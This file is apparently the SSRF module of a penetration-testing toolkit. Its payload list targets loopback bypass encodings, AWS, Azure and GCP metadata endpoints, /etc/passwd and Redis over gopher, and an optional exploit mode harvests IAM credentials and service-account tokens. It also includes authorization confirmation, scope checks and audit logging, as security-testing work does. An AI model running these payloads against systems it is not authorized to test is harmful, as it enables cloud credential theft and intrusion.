"""SSRF — internal-host probing + cloud metadata fetch.

Note: this is a *targeted* SSRF probe — the user provides a URL with a FUZZ
marker that the target server fetches; we test whether the marker can point
the server at internal/metadata endpoints.

WS  /ws/ssrf
    client -> server:
        {"url":"...FUZZ...", "method","body","headers","cookies",
         "allow_private":false, "rate_per_sec":5,
         "exploit":false, "confirm_auth":true}
"""
from __future__ import annotations

import asyncio
import logging
import secrets
import time

from urllib.parse import urlparse

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import audit_log, scope, web_fuzz
from lib.errors import ErrorCode, MhpError, ws_error
from lib.mode import get_mode
from lib.validators import validate_url

logger = logging.getLogger(__name__)

router = APIRouter(tags=["ssrf"])

# Per-payload row: (label, payload-url, extra-headers, expected-sigs)
PAYLOADS: list[tuple[str, str, dict[str, str], list[str]]] = [
    ("loopback",        "http://127.0.0.1/", {}, ["server:", "<html"]),
    ("loopback-name",   "http://localhost/", {}, ["server:", "<html"]),
    ("zero",            "http://0.0.0.0/",   {}, ["server:", "<html"]),
    # IPv4 representation variants
    ("dec-int",         "http://2130706433/",        {}, ["server:", "<html"]),
    ("hex",             "http://0x7f000001/",        {}, ["server:", "<html"]),
    ("octal",           "http://0177.0.0.1/",        {}, ["server:", "<html"]),
    ("short",           "http://127.1/",             {}, ["server:", "<html"]),
    # AWS IMDS v1
    ("aws-imds-root",        "http://169.254.169.254/latest/meta-data/",
        {}, ["ami-id", "instance-id", "iam/"]),
    ("aws-imds-iam",         "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        {}, ["AccessKeyId", "SecretAccessKey", "Token"]),
    # AWS IMDSv2 (token required — most callers don't proxy headers, but try anyway)
    ("aws-imds-v2-token",    "http://169.254.169.254/latest/api/token",
        {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, ["AQAEA"]),
    # Azure
    ("azure-imds",     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        {"Metadata": "true"}, ["compute", "vmId", "subscriptionId"]),
    # GCP
    ("gcp-meta",       "http://metadata.google.internal/computeMetadata/v1/",
        {"Metadata-Flavor": "Google"}, ["instance/", "project/"]),
    ("gcp-token",      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        {"Metadata-Flavor": "Google"}, ["access_token", "Bearer"]),
    # Schemes
    ("file-passwd",    "file:///etc/passwd", {}, ["root:"]),
    ("gopher",         "gopher://127.0.0.1:6379/_INFO", {}, ["redis_version", "tcp_port"]),
    # DNS-based confirmation hint (not auto-confirmable here)
    ("dns-rebind",     "http://0.0.0.0.nip.io/", {}, []),
]


@router.websocket("/ws/ssrf")
async def ssrf_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()
    audit_id: str | None = None

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        engagement_id = init.get("engagement_id") or None
        url = str(init.get("url", "")).strip()
        try:
            url = validate_url(url, field="url")
        except MhpError as exc:
            await ws.send_json(ws_error(exc.code, exc.message))
            await ws.close(); return

        base_headers = dict(init.get("headers") or {})
        tmpl = web_fuzz.FuzzTemplate(
            url=url,
            method=str(init.get("method", "GET")).upper(),
            body=str(init.get("body", "")),
            headers=base_headers,
            cookies=dict(init.get("cookies") or {}),
        )
        if not tmpl.has_marker():
            await ws.send_json(ws_error(
                ErrorCode.BAD_REQUEST,
                f"Place '{web_fuzz.DEFAULT_MARKER}' where the SSRF URL parameter goes",
            ))
            await ws.close(); return
        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to test this target",
            ))
            await ws.close(); return

        confirm = bool(init.get("confirm", False))
        init_mode = str(init.get("mode", "")).strip().lower()
        mode = "engagement" if init_mode == "engagement" else (
            "lab" if init_mode == "lab" else get_mode(ws)
        )
        host_for_scope = urlparse(url).hostname or url
        if not await scope.enforce_ws(ws, host_for_scope, engagement_id, mode, confirm=confirm, active=True, action="ssrf"):
            return

        # `allow_private` here refers to the OUTER URL (target), not the
        # injected one — we always want to test internal-IP payloads.
        allow_private = bool(init.get("allow_private", False))
        ok, reason = web_fuzz.check_scope(url, allow_private)
        if not ok:
            await ws.send_json(ws_error(ErrorCode.TARGET_DENIED, reason))
            await ws.close(); return

        rate = max(1, min(int(init.get("rate_per_sec", 5)), 20))
        do_exploit = bool(init.get("exploit", False))

        try:
            audit_id = audit_log.start(
                tool="ssrf", target=url,
                argv=[tmpl.method, url, f"payloads={len(PAYLOADS)}",
                      f"exploit={do_exploit}", f"rate={rate}/s"],
                engagement_id=engagement_id,
            )
        except Exception:
            logger.exception("audit_log.start failed (scan continues)")

        # Reflection / catch-all oracle.
        #
        # Many endpoints that accept a URL parameter (e.g. a ping page that
        # echoes the input back, or a static landing page) return the SAME
        # response regardless of what the marker is replaced with. Without an
        # oracle the scanner reported every loopback-bypass payload as a
        # high-severity SSRF finding — 7 false positives observed against a
        # cmdi page 2026-06-13.
        #
        # Fix: substitute the marker with a URL that's guaranteed not to
        # resolve (RFC 6761 — `.invalid` TLD) and capture (status, length).
        # Any payload whose response closely matches that signature is the
        # endpoint reflecting input, not the server actually fetching the
        # SSRF target — suppress the finding (still emit `attempt`).
        bogus_url = f"http://_mhp_probe_{secrets.token_hex(6)}.invalid/"
        baseline_resp = await web_fuzz.baseline(tmpl, sentinel=bogus_url, timeout=15.0)
        baseline_sig: tuple[int, int] | None = None
        if baseline_resp.status is not None:
            baseline_sig = (baseline_resp.status, baseline_resp.length)

        await ws.send_json({"type": "started", "url": url,
                            "total_payloads": len(PAYLOADS),
                            "audit_id": audit_id,
                            "baseline": (
                                {"status": baseline_sig[0],
                                 "length": baseline_sig[1],
                                 "probe": bogus_url}
                                if baseline_sig else None
                            )})

        def _matches_baseline(status: int | None, length: int) -> bool:
            """True if a response is indistinguishable from the bogus-host
            baseline within 2% length slop or 64 bytes — meaning the
            endpoint is reflecting input rather than fetching the SSRF
            target."""
            if baseline_sig is None or status is None:
                return False
            if status != baseline_sig[0]:
                return False
            slop = max(64, baseline_sig[1] // 50)
            return abs(length - baseline_sig[1]) <= slop

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        findings = 0
        confirmed_clouds: set[str] = set()

        # Run sequentially so we can adjust headers per payload (some need
        # specific headers to be added to the OUTER request).
        for i, (label, p_url, extra_hdrs, sigs) in enumerate(PAYLOADS):
            if stop.is_set():
                break
            local_tmpl = web_fuzz.FuzzTemplate(
                url=tmpl.url, method=tmpl.method, body=tmpl.body,
                headers={**tmpl.headers, **extra_hdrs},
                cookies=tmpl.cookies,
            )
            r = await web_fuzz.baseline(local_tmpl, sentinel=p_url, timeout=15.0)
            hit_sig = web_fuzz.contains_any(r.body, sigs) if sigs else None
            reflected = _matches_baseline(r.status, r.length)
            await ws.send_json({
                "type": "attempt", "label": label, "payload": p_url,
                "status": r.status, "length": r.length,
                "elapsed_ms": r.elapsed_ms, "hit": hit_sig,
                "reflected": reflected,
            })
            # Gate findings on the oracle: a hit-signature match against a
            # response that's indistinguishable from the bogus-host baseline
            # is reflection, not real SSRF. Suppress the finding (the
            # `attempt` row above already carries the visible state).
            if hit_sig and not reflected:
                findings += 1
                if label.startswith("aws"):    confirmed_clouds.add("aws")
                if label.startswith("azure"):  confirmed_clouds.add("azure")
                if label.startswith("gcp"):    confirmed_clouds.add("gcp")
                await ws.send_json({
                    "type": "finding", "severity": "high", "label": label,
                    "payload": p_url, "evidence": r.body[:600],
                    "confirmed": True,
                })
            # Rate-limit between payloads
            await asyncio.sleep(1.0 / rate)

        # Exploit: walk IMDS recursively for whichever cloud was reachable
        if do_exploit and confirmed_clouds and not stop.is_set():
            for cloud in confirmed_clouds:
                if stop.is_set():
                    break
                if cloud == "aws":
                    paths = [
                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "http://169.254.169.254/latest/dynamic/instance-identity/document",
                        "http://169.254.169.254/latest/user-data",
                    ]
                elif cloud == "azure":
                    paths = [
                        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                    ]
                else:  # gcp
                    paths = [
                        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                    ]
                for p in paths:
                    extra = {"Metadata": "true"} if cloud == "azure" else (
                            {"Metadata-Flavor": "Google"} if cloud == "gcp" else {})
                    local_tmpl = web_fuzz.FuzzTemplate(
                        url=tmpl.url, method=tmpl.method, body=tmpl.body,
                        headers={**tmpl.headers, **extra}, cookies=tmpl.cookies,
                    )
                    r = await web_fuzz.baseline(local_tmpl, sentinel=p, timeout=20.0)
                    # Same oracle check — only emit when the response
                    # materially differs from the bogus-host baseline.
                    if _matches_baseline(r.status, r.length):
                        await ws.send_json({
                            "type": "attempt", "label": f"{cloud}-exploit",
                            "payload": p, "status": r.status,
                            "length": r.length, "reflected": True,
                        })
                        continue
                    await ws.send_json({
                        "type": "finding", "severity": "high",
                        "label": f"{cloud}-exploit",
                        "payload": p, "evidence": r.body[:1200],
                        "confirmed": True,
                    })

        listener.cancel()
        elapsed = round(time.monotonic() - t0, 2)
        await ws.send_json({"type": "done", "elapsed": elapsed,
                            "findings": findings,
                            "clouds": sorted(confirmed_clouds),
                            "stopped": stop.is_set()})
        if audit_id:
            clouds_str = (", clouds=" + ",".join(sorted(confirmed_clouds))) if confirmed_clouds else ""
            summary = f"{findings} findings{clouds_str}, {elapsed}s"
            try:
                if stop.is_set():
                    audit_log.stopped(audit_id, summary=summary)
                else:
                    audit_log.complete(audit_id, summary=summary)
            except Exception:
                logger.exception("audit_log finalize failed")
    except WebSocketDisconnect:
        stop.set()
        if audit_id:
            try: audit_log.stopped(audit_id, summary="client disconnected")
            except Exception: pass
    except Exception as exc:
        logger.exception("ssrf_ws unhandled exception")
        if audit_id:
            try: audit_log.error(audit_id, f"{type(exc).__name__}: {exc}")
            except Exception: pass
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                "internal error during SSRF scan",
            ))
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass
